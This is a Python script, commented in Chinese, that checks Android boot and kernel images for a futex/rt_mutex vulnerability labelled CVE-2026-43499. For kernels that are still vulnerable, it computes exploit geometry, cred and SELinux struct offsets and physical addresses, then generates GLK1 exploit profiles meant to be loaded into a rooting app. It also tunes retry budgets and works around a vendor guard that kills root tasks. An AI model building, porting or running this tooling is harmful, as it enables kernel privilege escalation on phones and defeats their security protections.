#!/usr/bin/env python3
"""auto.py — 「这个机型能不能用我们这条链路」一键判定（纯静态，不用设备）

输入可以是任意形态：boot.img（v0-v4）、boot_a.img、Image、Image.gz、vendor_boot.img、
全量包 zip、甚至一个目录/通配符批量。内部全自动：

    carve.unpack   →  内核 Image（含 gzip/lz4/xz/zstd 解压、OEM 前缀头、zip 递归）
    kallsyms       →  符号表（自动定位，基址按 _text 取，不写死 VA_BITS=39）
    containers     →  A. sigret(rt_sigreturn fpsimd)  B. multicast(setsockopt greqs)
                      两条都算，取可行的那条（这就是「换机型不一定哪条成立」的兜底）
    structs        →  BTF 优先；无 BTF 用反汇编推导 + 族表
    phys           →  vendor_boot kernel_addr / qcom 默认 / 显式覆盖
    page           →  ikconfig 里的 CONFIG_ARM64_*_PAGES

判决
----
    USABLE          硬门槛全过，且结构偏移有依据（BTF 或已验证族表）
    RISKY           能算，但有未证实项（无 BTF、页大小未知、phys 未定）
    NOT-APPLICABLE  已打补丁 / futex 链不可得 / 两条容器几何都不可行

用法
----
    python auto.py boot.img
    python auto.py 目录/ --emit out/            # 批量 + 生成 GLK1
    python auto.py boot.img --vendor-boot vb.img   # MTK：用 vendor_boot 推 phys
    python auto.py boot.img --xbl-config xbl.img   # qcom：用 xbl_config 的 memorymap 证实 phys
    python auto.py boot.img --phys 0xa8000000,0x80000000
    python auto.py boot.img --json

退出码：0=全 USABLE；1=有 RISKY；2=有 NOT-APPLICABLE；3=参数/依赖错误
"""
import glob
import hashlib
import json
import os
import re
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

try:
    import capstone  # noqa: F401
except ImportError:
    sys.exit("需要 capstone：pip install capstone")

import carve            # noqa: E402
import containers       # noqa: E402
import glkimg           # noqa: E402
import phys as ph       # noqa: E402
import structs as st    # noqa: E402

PY = sys.executable
JSON_MODE = False


def log(*a):
    print(*a, file=sys.stderr if JSON_MODE else sys.stdout, flush=True)


def file_md5(path, chunk=1 << 20):
    h = hashlib.md5()
    with open(path, "rb") as f:
        while True:
            b = f.read(chunk)
            if not b:
                break
            h.update(b)
    return h.hexdigest()


def extract_symbols(image_path, sym_path):
    r = subprocess.run([PY, os.path.join(HERE, "extract_symbols_auto.py"),
                        image_path, sym_path], capture_output=True, text=True)
    return r.returncode == 0, (r.stdout + r.stderr)


# GLK1 里必须写进去的符号（缺一个就生成不出 profile：后面几个是 slide/KSU 用的）
REQUIRED_SYMS = ["init_task", "init_cred", "empty_zero_page", "root_task_group",
                 "selinux_state", "selinux_blob_sizes", "security_hook_heads",
                 "nfulnl_logger", "loggers", "sysctl_bootid"]


def analyse(path, outdir, vendor_boot=None, phys_override=None, xbl_config=None):
    row = {"input": path, "verdict": "", "notes": [], "gates": {}}
    r = carve.unpack(path, outdir)
    row.update(kind=r["kind"], container_kind=r["container"],
               release=r.get("release"), page_shift=r.get("page_shift"),
               page_shift_source=r.get("page_shift_source"),
               os_version=r.get("os_version"))
    if not r.get("image"):
        row["verdict"] = "NOT-APPLICABLE"
        row["notes"] += r.get("notes", []) or ["无法解出内核镜像"]
        return row
    img_bytes = r["image"]
    rel = r.get("release") or "unknown"
    row["notes"] += r.get("notes", [])

    # 版本硬门槛：KernelSU late-load 只有 GKI 5.10/6.1/6.6 的 KMI 产物，
    # 4.x 这类非 GKI 厂商内核既没有可用 .ko，也基本没有 BTF，直接给结论，
    # 免得后面 kallsyms/结构推导失败时报一个看不懂的错误。
    mv = re.match(r"(\d+)\.(\d+)", rel)
    if mv and (int(mv.group(1)), int(mv.group(2))) < (5, 10):
        row["verdict"] = "NOT-APPLICABLE"
        row["notes"].append(
            f"内核 {rel} < 5.10：KernelSU late-load 没有对应 KMI 产物（只有 GKI 5.10/6.1/6.6），"
            "本链路在这类非 GKI 老内核上不成立")
        return row

    # 缓存键要带内容哈希：vivo 的 "-maybe-dirty" 之类 release 串不含 commit，
    # 两个不同 build 会撞成同一个名字（会把 A 的分析结果套到 B 上）
    img_md5 = hashlib.md5(img_bytes).hexdigest()[:12]
    tag = rel
    img_path = os.path.join(outdir, f"Image-{tag}")
    if os.path.exists(img_path) and file_md5(img_path) != img_md5:
        tag = f"{rel}-{img_md5}"
        img_path = os.path.join(outdir, f"Image-{tag}")
    if not os.path.exists(img_path):
        open(img_path, "wb").write(img_bytes)
    row["tag"] = tag
    sym_path = os.path.join(outdir, f"symbols-{tag}.json")
    if not os.path.exists(sym_path):
        ok, out = extract_symbols(img_path, sym_path)
        if not ok:
            row["verdict"] = "NOT-APPLICABLE"
            row["notes"].append("kallsyms 提取失败：" + out.strip().splitlines()[-1][:90])
            return row

    img = glkimg.Image(img_path, sym_path)
    row["base"] = img.base
    row["n_syms"] = len(img.syms)
    c = containers.derive_all(img)
    row["containers"] = [{k: v for k, v in x.items() if k not in ("frames",)}
                         for x in c["containers"]]
    row["waiter"] = c["waiter"]
    row["vulnerable"] = c["vulnerable"]

    # 结构偏移
    try:
        s = st.resolve(img_path, sym_path, rel)
    except Exception as e:                                    # noqa: BLE001
        s = {"fields": {}, "source": "failed", "confidence": "low", "notes": [str(e)],
             "derived": {}}
    row["structs"] = {"source": s["source"], "confidence": s["confidence"],
                      "notes": s["notes"], "fields": s["fields"]}
    miss = [k for k in ("prio", "pi_lock", "pi_blocked_on", "real_cred", "cred",
                        "cred_caps", "waiter_task", "waiter_lock") if s["fields"].get(k) is None]
    row["structs"]["missing"] = miss

    # phys
    if phys_override == "none":
        pr = {"load": None, "offset": None, "source": "--phys none", "confidence": "high",
              "note": "按用户要求不写 phys（沿用运行时内置值）", "write": False}
    else:
        pr = ph.probe(image_path=img_path, vendor_boot=vendor_boot, override=phys_override,
                      xbl_config=xbl_config)
        pr["write"] = pr["load"] is not None
        if pr["load"] is None and r.get("vendor_boot_kernel_addr"):
            try:
                load, off = ph.classify_vendor_boot_addr(r["vendor_boot_kernel_addr"])
                pr = {"load": load, "offset": off, "source": "自身 vendor_boot kernel_addr",
                      "confidence": "high", "note": "镜像自带 kernel_addr", "write": True}
            except Exception:                                  # noqa: BLE001
                pass
    row["phys"] = {"load": pr["load"], "offset": pr["offset"], "source": pr["source"],
                   "confidence": pr["confidence"], "note": pr["note"],
                   "write": pr.get("write", pr["load"] is not None)}

    # ---- 判决 ----
    miss_syms = [s for s in REQUIRED_SYMS if s not in img.syms]
    row["missing_symbols"] = miss_syms
    if miss_syms:
        row["verdict"] = "NOT-APPLICABLE"
        row["notes"].append("profile 必需符号缺失（内核配置/形态不同）：" + ", ".join(miss_syms))
        return row
    if c["vulnerable"] is False:
        row["verdict"] = "NOT-APPLICABLE"
        row["notes"].append("remove_waiter 已不再用 current ⇒ CVE-2026-43499 已修复")
        if c["containers"]:
            geo = "；".join(
                f"{x['route']} waiter_off=0x{x['waiter_off']:x}"
                + ("（可行）" if x["feasible"] else "（不可行）") for x in c["containers"])
            row["notes"].append(f"（仅供参照，不可用）几何本来能算：{geo}")
            row["containers"] = []
        return row
    if c.get("error"):
        row["verdict"] = "NOT-APPLICABLE"
        row["notes"].append(c["error"])
        return row
    if not c["best"]:
        row["verdict"] = "NOT-APPLICABLE"
        row["notes"].append("两条容器几何都不可行：" +
                            "；".join(f"{x['route']}={x['reason']}" for x in c["containers"]))
        return row
    row["best"] = c["best"]["route"]
    row["profile"] = c["best"]["profile"]

    risky = []
    if s["confidence"] == "low":
        risky.append("结构偏移低置信（无 BTF 且族表未验证）" + (f"，缺 {','.join(miss)}" if miss else ""))
    if r.get("page_shift") is None:
        risky.append("页大小未知（链路按 4K 页设计）")
    elif r["page_shift"] != 12:
        risky.append(f"内核页大小 {1 << r['page_shift']} ≠ 4K，本链路未在该形态验证")
    if pr["load"] is None and pr.get("write", True):
        risky.append("phys 无法静态确定：" + pr["note"])
    row["risky"] = risky
    row["verdict"] = "RISKY" if risky else "USABLE"
    return row


def emit(row, outdir, full_cred=False, loggers_delta=8, cpus=None, collisions=None):
    """生成可直接塞进 APP 的 GLK1"""
    import gen_glk1_new_build as gen
    rel = row["release"]
    tag = row.get("tag") or rel
    sym = os.path.join(outdir, f"symbols-{tag}.json")
    sjson = os.path.join(outdir, f"structs-{tag}.json")
    json.dump({"fields": row.get("structs", {}).get("fields", {}),
               "source": row.get("structs", {}).get("source"),
               "confidence": row.get("structs", {}).get("confidence")},
              open(sjson, "w", encoding="utf-8"), indent=2, default=str)
    prof = row["profile"]
    pv = row["phys"]
    # multicast 路线要求 cred 整体拷贝 >= 0xa0（官方 profile 注释：copy_size 176 + 4 个引用），
    # 最小覆盖（80 字节）在这条路线上会把 ref 指针留成旧 cred 的，跑不通
    geo = dict(prof)
    vr_tp = None
    if (row.get("best") or "") == "multicast":
        full_cred = True
        # One setsockopt per draw, so the profile needs a lottery budget.
        # 128/16/20000 are the device-verified vivo values; sigret profiles
        # leave them out and keep the historical single punch.
        geo.setdefault("attempts", 128)
        geo.setdefault("arm_sequence", 16)
        geo.setdefault("arm_hold", 20000)
        # vivo's vr.ko kills uid-0 tasks at sys_exit; multicast kernels in this
        # tree are all vivo, so record the tracepoint the guard hangs off.
        vr_tp = "auto"
    glk = os.path.join(outdir, f"{tag}.glk1")
    if not pv.get("write", True):
        phys_arg = "none"
    elif pv.get("load") is not None and pv.get("offset") is not None:
        phys_arg = (pv["load"], pv["offset"])
    else:
        phys_arg = None
    import contextlib
    with contextlib.redirect_stdout(sys.stderr if JSON_MODE else sys.stdout):
        gen.build(sym, rel, glk,
                  geometry=geo,
                  full_cred=full_cred, loggers_delta=loggers_delta,
                  phys=phys_arg,
                  structs_json=sjson,
                  cpus=cpus, collisions=collisions, vr_tp=vr_tp)
    # 路线旁注：sigret 用 GL_PUNCH=sigret，multicast 用默认路径（GL_PUNCH 留空）
    open(os.path.join(outdir, f"{tag}.route"), "w", encoding="utf-8").write(
        row.get("best") or "")
    row["glk1"] = glk
    return glk


def collect(targets):
    files = []
    for t in targets:
        if os.path.isdir(t):
            for ext in ("*.img", "*.bin", "*.zip", "Image*"):
                files += sorted(glob.glob(os.path.join(t, ext)))
        elif any(ch in t for ch in "*?["):
            files += sorted(glob.glob(t))
        else:
            files.append(t)
    seen, out = set(), []
    for f in files:
        k = os.path.abspath(f)
        if k not in seen and os.path.isfile(f):
            seen.add(k)
            out.append(f)
    return out


def main():
    args = sys.argv[1:]
    if not args:
        sys.exit(__doc__)
    outdir, vendor_boot, phys_override = os.path.join(os.getcwd(), "autoport"), None, None
    xbl_config = None
    cpus = None
    collisions = None
    want_json = "--json" in args
    do_emit = "--emit" in args
    force_emit = "--force-emit" in args
    global JSON_MODE
    JSON_MODE = want_json          # --json 时把过程日志改走 stderr，stdout 只留 JSON
    full_cred = "--full-cred" in args
    loggers_delta = 8
    rest, i = [], 0
    while i < len(args):
        a = args[i]
        if a == "--out":
            outdir = args[i + 1]; i += 2
        elif a == "--vendor-boot":
            vendor_boot = args[i + 1]; i += 2
        elif a == "--xbl-config":
            xbl_config = args[i + 1]; i += 2
        elif a == "--phys":
            v = args[i + 1]
            phys_override = "none" if v == "none" else tuple(int(x, 0) for x in v.split(","))
            i += 2
        elif a == "--cpus":
            m_, c_ = args[i + 1].split(",")
            cpus = {"main": int(m_, 0), "consumer": int(c_, 0)}
            i += 2
        elif a == "--collisions":
            collisions = int(args[i + 1], 0); i += 2
        elif a == "--loggers-delta":
            loggers_delta = int(args[i + 1], 0); i += 2
        elif a in ("--json", "--emit", "--full-cred", "--force-emit"):
            i += 1
        else:
            rest.append(a); i += 1
    if not rest:
        sys.exit(__doc__)
    os.makedirs(outdir, exist_ok=True)

    files = collect(rest)
    if not files:
        sys.exit("没有匹配到文件")

    rows = []
    for f in files:
        log(f"[*] {os.path.basename(f)}")
        try:
            r = analyse(f, outdir, vendor_boot, phys_override, xbl_config)
        except Exception as e:                                # noqa: BLE001
            r = {"input": f, "verdict": "NOT-APPLICABLE", "notes": [f"分析异常: {e}"]}
        if do_emit and r["verdict"] in ("USABLE", "RISKY") and r.get("profile"):
            if r.get("structs", {}).get("confidence") == "low" and not force_emit:
                r["notes"].append("结构偏移低置信（无 BTF 且族表未验证）⇒ 不生成 GLK1；"
                                  "确认要用请加 --force-emit")
            else:
                try:
                    emit(r, outdir, full_cred, loggers_delta, cpus, collisions)
                except Exception as e:                        # noqa: BLE001
                    r["notes"].append(f"GLK1 生成失败: {e}")
        rows.append(r)

    if "--json" in sys.argv:
        print(json.dumps(rows, indent=2, ensure_ascii=False, default=str))
    else:
        log("")
        log("=" * 104)
        log(f"{'判定':16s} {'release':44s} {'容器':10s} {'waiter_off':10s} 其它")
        log("=" * 104)
        icon = {"USABLE": "✅ USABLE", "RISKY": "⚠️  RISKY", "NOT-APPLICABLE": "❌ N/A"}
        for r in rows:
            prof = r.get("profile") or {}
            wo = f"0x{prof['waiter_off']:x}" if prof else "-"
            extra = []
            if r.get("structs"):
                extra.append(f"structs={r['structs']['confidence']}")
            if r.get("page_shift") is not None:
                extra.append(f"page={1 << r['page_shift']}")
            if r.get("phys", {}).get("load") is not None:
                pv = r["phys"]
                tail = "" if pv.get("confidence") == "high" else "~默认"
                extra.append(f"phys=0x{pv['load']:x}{tail}")
            log(f"{icon.get(r['verdict'], r['verdict']):16s} {(r.get('release') or '?')[:44]:44s} "
                f"{r.get('best', '-'):10s} {wo:10s} {' '.join(extra)}")
        log("")
        for r in rows:
            if r["verdict"] == "USABLE" and not r.get("risky"):
                continue
            log(f"[{r['verdict']}] {os.path.basename(r['input'])}")
            for n in r.get("notes", []):
                log(f"    · {n}")
            for n in r.get("risky", []):
                log(f"    ⚠ {n}")
            for x in r.get("containers", []):
                mark = "✅" if x["feasible"] else "❌"
                log(f"    {mark} {x['route']:10s} buffer=0x{x['buffer']:x} "
                    f"waiter_off=0x{x['waiter_off']:x} {x['reason']}")
            if r.get("glk1"):
                log(f"    → {r['glk1']}")
            log("")

    n_bad = sum(1 for r in rows if r["verdict"] == "NOT-APPLICABLE")
    n_risk = sum(1 for r in rows if r["verdict"] == "RISKY")
    log(f"共 {len(rows)} 个：USABLE {len(rows) - n_bad - n_risk} · RISKY {n_risk} · "
        f"NOT-APPLICABLE {n_bad}   产物目录 {outdir}")
    sys.exit(0 if n_bad == 0 and n_risk == 0 else (2 if n_bad else 1))


if __name__ == "__main__":
    main()
